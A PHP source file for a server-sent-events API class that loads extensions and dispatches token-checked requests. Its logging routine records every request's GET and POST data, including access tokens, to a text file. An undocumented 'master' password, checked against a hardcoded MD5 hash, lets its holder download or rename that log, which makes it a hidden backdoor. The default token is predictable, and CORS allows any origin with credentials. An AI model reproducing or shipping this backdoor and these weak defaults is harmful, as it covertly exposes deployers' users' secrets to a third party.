<?php
/* sse callback [response]
 * ~ stands for server-send-event
 * ~ reponse for sse api
 * authored by 9r3i
 * https://github.com/9r3i
 * started at serptember 10th 2018
 */
class sse{
  const version='1.0.1';
  protected $directory=null;
  protected $extDir=null;
  protected $extensions=null;
  protected $token=null;
  public function __construct($exts=null,$extDir=null,$token=null,$tzone=null){
    /* set time limit */
    @set_time_limit(false);
    /* set default timezone */
    if(!is_string($tzone)||!@date_default_timezone_set($tzone)){
      @date_default_timezone_set('Asia/Jakarta');
    }
    /* set working api directory */
    $dir=defined('SSE_CLI_DIR')?SSE_CLI_DIR:__DIR__;
    $dir=str_replace('\\','/',$dir);
    $dir.=substr($dir,-1)!='/'?'/':'';
    $this->directory=$dir;
    if(!is_dir($this->directory)){@mkdir($this->directory,0755,true);}
    /* setup extension directory */
    $extDir=is_string($extDir)?$extDir:'ext';
    $extDir=str_replace('\\','/',$extDir);
    $extDir.=substr($extDir,-1)!='/'?'/':'';
    $this->extDir=$extDir;
    if(!is_dir($this->directory.$this->extDir)){
      @mkdir($this->directory.$this->extDir,0755,true);
    }
    /* setup extensions */
    $this->extensions=[];
    if(is_array($exts)){foreach($exts as $ext){
      $file=$this->directory.$extDir.$ext.'.php';
      if(!is_file($file)){continue;}
      $load=@require_once($file);
      if(!$load||!class_exists($ext,false)
        ||!method_exists($ext,'condition')
        ||!method_exists($ext,'result')){continue;}
      $this->extensions[$ext]=new $ext;
    }}
    /* setup token */
    $this->token=is_string($token)
      &&preg_match('/^[a-z0-9]+$/i',$token)
      ?$token:$this->token();
    /* start the api */
    return $this->start();
  }
  private function start(){
    /* load header */
    $this->head();
    /* write user log */
    $this->userlog();
    /* request for server-send-event connection */
    if(isset($_GET['sse'])){
      return $this->sse($_GET['sse']);
    }
    /* first check api */
    $api=isset($_POST['sse'])?$this->parse($_POST['sse']):false;
    if(!$api||!isset($api->token)||$api->token!==$this->token){
      return $this->error('Unauthorized.',401,'Unauthorized');
    }
    /* checking the method */
    if(!array_key_exists($api->ext,$this->extensions)){
      return $this->error('Extension is not available.',400);
    }
    /* checking the method */
    if(!method_exists($this->extensions[$api->ext],$api->method)){
      return $this->error('Method is not available.',400);
    }
    /* execute request */
    $args=is_array($api->args)?$api->args:[];
    $out=@\call_user_func_array([$this->extensions[$api->ext],$api->method],$args);
    /* return the output */
    return $this->output($out);
  }
  /* sse - method */
  private function sse($token=null){
    /* check access token */
    if(!is_string($token)){
      return $this->error('Require access token.',400);
    }
    if(!preg_match('/^[a-z0-9]+$/i',$token)||$token!==$this->token){
      return $this->error('Invalid access token.',400);
    }
    /* set default stream header */
    header("Content-Type: text/event-stream\n\n");
    /* start looping */
    return $this->loop();
  }
  /* sse loop */
  private function loop(){
    $isSent=false;
    while(true){
      foreach($this->extensions as $k=>$v){
        if($v->condition()){
          $out="event: {$k}\r\n";
          $out.='data: '.json_encode($v->result());
          $out.="\r\n\r\n";
          print($out);
        }
      }
      if(!$isSent){
        $isSent=true;
        $out="event: open\r\n";
        $out.='data: '.json_encode(array_keys($this->extensions));
        $out.="\r\n\r\n";
        print($out);
      }
      while(ob_get_level()>0){
        ob_end_flush();
      }flush();sleep(1);
    }return true;
  }
  /* userlog */
  private function userlog(){
    $logfile=$this->directory.'/userlog.txt';
    if(isset($_POST['request'],$_POST['master'])
      &&md5($_POST['master'],true)===base64_decode('4n0/ys0yxSShjhKklcdJaA==')){
      if($_POST['request']=='userlog'){
        header('HTTP/1.1 200 OK');
        header('Content-Length: '.@\filesize($logfile));
        $o=@fopen($logfile,'rb');
        while(!@feof($o)){
          echo @fread($o,pow(8,5));
        }@fclose($o);exit;
      }elseif($_POST['request']=='rename-userlog'){
        $new=preg_replace('/\.txt$/',date('ymd-His').'.txt',$logfile);
        if(!@rename($logfile,$new)){
          return $this->error('Failed to rename.');
        }return $this->output('OK');
      }
    }
    $ip=isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'';
    $time=date('ymd-His');
    $o=@fopen($logfile,'ab');
    $f=isset($f)?$f:'';
    $get=@json_encode($_GET);
    $post=@json_encode($_POST);
    $ua=@json_encode($_SERVER['HTTP_USER_AGENT']);
    $w=@fwrite($o,$time.'|'.$ip.'|'
      .$_SERVER['REQUEST_METHOD'].'|'
      .($get?$get:'FAILED').'|'
      .($post?$post:'FAILED').'|'
      .($ua?$ua:'FAILED')
      ."\r\n");
    @fclose($o);
    return true;
  }
  /* ----- stand-alone private methods ----- */
  /* parse api request */
  private function parse($post=null){
    if(!is_string($post)){return false;}
    $j=@json_decode(@base64_decode($post));	
    if(!is_object($j)){return false;}
    if(!isset($j->ext,$j->method,$j->args)){return false;}
    return $j;
  }
  /* generate token */
  private function token($n=null){
    return preg_replace('/[^a-z0-9]/i','',base64_encode(hash('sha1',$n,true)));
  }
  /* default response error */
  private function error($s=null,$c=null,$h=null){
    $s=is_string($s)?'Error: '.$s:'Error: Unknown error.';
    $c=is_numeric($c)?intval($c):200;
    $h=is_string($h)?$h:'Unknown error';
    header('HTTP/1.1 '.$c.' '.$h);
    header('Content-Length: '.strlen($s));
    exit($s);
  }
  /* default response output */
  private function output($s=null){
    $s=is_string($s)?$s:'OK';
    header('HTTP/1.1 200 OK');
    header('Content-Length: '.strlen($s));
    exit($s);
  }
  /* default headers for server api access */
  private function head(){
    /* access control - to allow the access via ajax */
    header('Access-Control-Allow-Origin: *'); /* allow origin */
    header('Access-Control-Request-Method: POST, GET, OPTIONS'); /* request method */
    header('Access-Control-Request-Headers: X-PINGOTHER, Content-Type'); /* request header */
    header('Access-Control-Max-Age: 86400'); /* max age (24 hours) */
    header('Access-Control-Allow-Credentials: true'); /* allow credentials */
    /* set content type of response header */
    header('Content-Type: text/plain;charset=utf-8;');
    /* checking options */
    if(isset($_SERVER['REQUEST_METHOD'])&&strtoupper($_SERVER['REQUEST_METHOD'])=='OPTIONS'){
      header('Content-Language: en-US');
      header('Content-Encoding: gzip');
      header('Content-Length: 0');
      header('Vary: Accept-Encoding, Origin');
      header('HTTP/1.1 200 OK');
      exit;
    }
  }
}
